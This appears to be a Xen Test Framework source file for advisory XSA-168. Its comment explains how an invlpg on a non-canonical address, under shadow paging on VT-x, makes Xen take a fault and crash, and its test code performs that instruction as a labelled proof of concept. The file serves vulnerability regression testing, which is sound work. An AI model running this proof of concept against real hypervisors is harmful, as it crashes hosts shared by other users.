/**
 * @file tests/xsa-168/main.c
 * @ref test-xsa-168
 *
 * @page test-xsa-168 XSA-168
 *
 * Advisory: [XSA-168](http://xenbits.xen.org/xsa/advisory-168.html)
 *
 * This vulnerability only affects VT-x hardware, and can only exploited by a
 * guest running with shadow paging.
 *
 * The `invlpg` (and `invlpga` on AMD) instructions are specified to be nops
 * for non-canonical addresses.  When using HAP, the instructions are not
 * intercepted, and dealt with by hardware.
 *
 * However with shadow paging, the instructions are intercepted to prevent
 * @#PF's from not-yet-populated shadows.  On VT-x hardware, this ends up
 * turning into a `invvpid` in Xen, which does suffer a @#GP on a
 * non-canonical address.
 *
 * To cause Xen to execute an `invvpid` instruction, the address (omitting the
 * sign extension) must be a small page.  This is covered in XTF because the
 * single 4K page at NULL is unmapped.
 *
 * The testcase attempts to execute such an `invlpg` instruction.  If running
 * in shadow mode, on VT-x hardware, on a vulnerable version, Xen will crash
 * with a @#GP fault.  If not, the test will exit cleanly.  The test is unable
 * to distinguish between a fixed Xen and a test misconfiguration.
 *
 * @sa tests/xsa-168/main.c
 */
#include <xtf/lib.h>

void test_main(void)
{
    printk("XSA-168 PoC\n");

    /**
     * At the time of writing, Xen doesn't correctly handle `invlpg` while
     * running in shadow mode on AMD Gen1 hardware lacking decode assistance.
     * For this test, we simply care that Xen doesn't crash.
     *
     * @todo Write a different test which cares about the architecturally
     * correct handling of `invlpg`.
     */
    asm volatile ("1: invlpg (%0); 2:"
                  _ASM_EXTABLE(1b, 2b)
                  :: "q" (0x8000000000000000UL));

    xtf_success(NULL);
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
